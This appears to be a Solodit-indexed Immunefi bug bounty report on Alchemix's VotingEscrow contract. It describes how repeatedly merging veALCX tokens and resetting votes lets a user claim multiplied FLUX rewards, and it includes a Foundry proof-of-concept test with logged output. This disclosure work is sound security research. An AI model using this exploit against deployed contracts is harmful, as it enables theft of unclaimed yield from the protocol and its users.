---
# Core Classification
protocol: Alchemix
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 38234
audit_firm: Immunefi
contest_link: https://immunefi.com/bounty/alchemix-boost/
source_link: none
github_link: https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/Alchemix/31512%20-%20%5bSC%20-%20Critical%5d%20Infinite%20minting%20of%20FLUX%20through%20Merge.md

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - liquid_staking
  - dexes
  - yield
  - cross_chain
  - rwa

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Django
---

## Vulnerability Title

Infinite minting of FLUX through Merge

### Overview


This report discusses a bug found in the Smart Contract of Alchemix Finance. The bug allows users to claim more FLUX rewards than they are entitled to by merging their tokens. This can be done by increasing the balance of one token through the "reset" function and then merging it with another token, effectively doubling the rewards that can be claimed. This can be repeated multiple times, resulting in an unauthorized increase in rewards for the user. The report includes a Proof of Concept showing how this bug can be exploited. 

### Original Finding Content

Report type: Smart Contract


Target: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol

Impacts:
- Theft of unclaimed yield

## Description
## Brief/Intro
Users are able to claim more FLUX rewards than they should simply by merging their tokens. Since the `merge()` operation increases the `_to` token's balance, the `_from` token can simply increment its unclaimed FLUX through `voter.reset()` and then merge its balance into `_to`. Then `_to` can claim with the increased balance. This operation can continue for as many iterations as desired.

## Vulnerability Details
Users increase their unclaimed FLUX balance through `voter.reset()` for their tokens after an epoch has passed. They can then claim their FLUX by calling `FLUX.claimFlux()`.

However, since the `claimableFlux()` FLUX balance of each token is taken at the current `block.timestamp`, a user can simply call `votingEscrow.merge()` to merge their already claimed tokens with an unclaimed token, increasing its balance and effectively doubling their rewards to claim.

```
    function claimableFlux(uint256 _tokenId) public view returns (uint256) {
        // If the lock is expired, no flux is claimable at the current epoch
        if (block.timestamp > locked[_tokenId].end) {
            return 0;
        }


        // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
        return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS;
    }
```

## Impact Details
- Unauthorized claiming of FLUX rewards

## Output from POC
```
[PASS] testAccrueFluxByMergeAndReset() (gas: 4170557)
Logs:
  **Each token should receive 984462360468700917 tokens per epoch
  Claim token1. It claims 1x rewards (normal)
  FLUX Balance 984462360468700917
  --------------------
  Merge the already claimed token1 to the unclaimed token2. Token2's balance increases.
  Claim token2. It claims 2x rewards.
  FLUX Balance 2953387081421625754
  --------------------
  Merge the already claimed token2 to the unclaimed token3. Token3's balance increases.
  Claim token3. It claims 4x rewards.
  FLUX Balance 5906774162843251509
  --------------------
  Merge the already claimed token3 to the unclaimed token4. Token4's balance increases.
  Claim token4. It claims 8x rewards.
  FLUX Balance 9844623604749101184
  --------------------
  After 3 merges, user has claimed 250% more rewards (10x/4x)
```



## Proof of Concept

```
function testAccrueFluxByMergeAndReset() public {
        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        uint256 tokenId3 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        uint256 tokenId4 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);

        hevm.startPrank(admin);

        uint256 claimedBalance = flux.balanceOf(admin);
        uint256 unclaimedBalance = flux.getUnclaimedFlux(tokenId1);

        assertEq(claimedBalance, 0);
        assertEq(unclaimedBalance, 0);

        // Reset token1 to claim the usual amount of flux
        voter.reset(tokenId1);
        unclaimedBalance = flux.getUnclaimedFlux(tokenId1);
        console.log("**Each token should receive %i tokens per epoch", unclaimedBalance);
        console.log("Claim token1. It claims 1x rewards (normal)");
        flux.claimFlux(tokenId1, flux.getUnclaimedFlux(tokenId1));
        console.log("FLUX Balance %s", flux.balanceOf(admin));
        console.log("--------------------");

        console.log("Merge the already claimed token1 to the unclaimed token2. Token2's balance increases.");
        veALCX.merge(tokenId1, tokenId2);

        console.log("Claim token2. It claims 2x rewards.");
        voter.reset(tokenId2);
        flux.claimFlux(tokenId2, flux.getUnclaimedFlux(tokenId2));
        console.log("FLUX Balance %s", flux.balanceOf(admin));
        console.log("--------------------");

        console.log("Merge the already claimed token2 to the unclaimed token3. Token3's balance increases.");
        veALCX.merge(tokenId2, tokenId3);

        console.log("Claim token3. It claims 4x rewards.");
        voter.reset(tokenId3);
        flux.claimFlux(tokenId3, flux.getUnclaimedFlux(tokenId3));
        console.log("FLUX Balance %s", flux.balanceOf(admin));
        console.log("--------------------");

        console.log("Merge the already claimed token3 to the unclaimed token4. Token4's balance increases.");
        veALCX.merge(tokenId3, tokenId4);

        console.log("Claim token4. It claims 8x rewards.");
        voter.reset(tokenId4);
        flux.claimFlux(tokenId4, flux.getUnclaimedFlux(tokenId4));
        console.log("FLUX Balance %s", flux.balanceOf(admin));
        console.log("--------------------");

        console.log("After 3 merges, user has claimed 250% more rewards (10x/4x)");

        hevm.stopPrank();
    }
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Immunefi |
| Protocol | Alchemix |
| Report Date | N/A |
| Finders | Django |

### Source Links

- **Source**: N/A
- **GitHub**: https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/Alchemix/31512%20-%20%5bSC%20-%20Critical%5d%20Infinite%20minting%20of%20FLUX%20through%20Merge.md
- **Contest**: https://immunefi.com/bounty/alchemix-boost/

### Keywords for Search

`vulnerability`

